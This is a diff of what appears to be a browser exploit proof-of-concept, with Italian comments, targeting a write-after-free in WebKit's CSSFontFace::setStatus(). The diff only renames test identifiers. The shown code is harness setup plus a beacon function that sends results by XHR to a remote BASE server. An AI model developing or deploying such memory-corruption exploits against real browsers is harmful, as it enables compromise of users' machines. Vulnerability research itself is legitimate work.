@@ -1,4 +1,4 @@
-// p601-fontface-status-writeback — CSSFontFace::setStatus() write-after-free, letto come oracolo di SCRITTURA
+// p565-fontface-status-writeback — CSSFontFace::setStatus() write-after-free, letto come oracolo di SCRITTURA
 //
 // Meccanismo (sorgente 1400):
 //   CSSFontSelector::addFontFaceRule ricrea la CSSFontFace della stessa regola e la ADOTTA
@@ -43,8 +43,8 @@
     var N = parseInt(q('n', '160'), 10) || 160;
     var WM = parseInt(q('wm', '40'), 10) || 0;
 
-    var out = document.createElement('pre'); out.id = 'p601-out'; document.body.appendChild(out);
-    var vd = document.createElement('div'); vd.id = 'p601-v';
+    var out = document.createElement('pre'); out.id = 'p565-out'; document.body.appendChild(out);
+    var vd = document.createElement('div'); vd.id = 'p565-v';
     vd.style.cssText = 'position:sticky;top:0;z-index:9;font:700 15px -apple-system,sans-serif;padding:.5rem .7rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a';
     vd.textContent = 'RUN'; document.body.appendChild(vd);
 
@@ -52,7 +52,7 @@
     function B(t, d) {
         try {
             var x = new XMLHttpRequest();
-            var u = BASE + '/beacon/P601-' + t + '?t=' + Date.now()
+            var u = BASE + '/beacon/P565-' + t + '?t=' + Date.now()
                 + (d !== undefined ? '&d=' + encodeURIComponent(String(d).slice(0, 300)) : '');
             x.open('GET', u, true); x.send();
         } catch (e) {}
